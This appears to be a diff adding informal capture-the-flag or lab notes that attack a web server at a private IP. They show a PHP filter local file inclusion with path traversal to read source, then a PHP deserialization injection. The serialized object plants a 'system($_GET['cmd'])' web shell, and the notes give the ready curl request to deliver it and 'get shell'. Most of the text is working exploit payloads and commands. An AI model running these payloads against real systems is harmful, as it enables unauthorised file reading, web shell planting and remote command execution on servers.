@@ -1,0 +1,38 @@
+php filter for lfi
+
+```
+http://192.168.120.209/?page=php://filter/convert.base64-encode/resource=blackdeath
+```
+
+there was 2 names on website ..those 2 were only working on filters
+
+so
+
+`http://192.168.120.209/?page=php://filter/convert.base64-encode/resource=blackdeath../../../../../../../../usr/share/nginx/html/index`
+
+for nginx check these files
+
+```
+public function __destruct() { 
+            file_put_contents(__DIR__ . '/' . $this->form_file,$this->msgo,FILE_APPEND);
+            echo 'Saved! :)';
+            }
+            }
+            $values_submit = $_GET['values_submit'] ?? '';
+            $msgovalues_submit = unserialize($values_submit);
+            
+            $webApp = new MyClass;
+            $webApp -> Savemsgo();
+```
+
+here imp functions, MyClass,msgo
+
+```
+`O:7:"MyClass":2:{s:9:"form_file";s:8:"test.php";s:4:"msgo";s:29:"<?php+system($_GET['cmd']);?>";}` 7 IS TOTAL ALPHABATES IN mycLASS , chnage foorm_file and msgo accordingly.
+
+```
+
+```
+ `curl "http://192.168.120.209:8080/index.php?values_submit=O:7:%22MyClass%22:2:%7Bs:9:%22form_file%22;s:8:%22test.php%22;s:4:%22msgo%22;s:29:%22%3C?php+system(\$_GET%5B'cmd'%5D);?%3E%22;%7D"`
+then get shell
+```
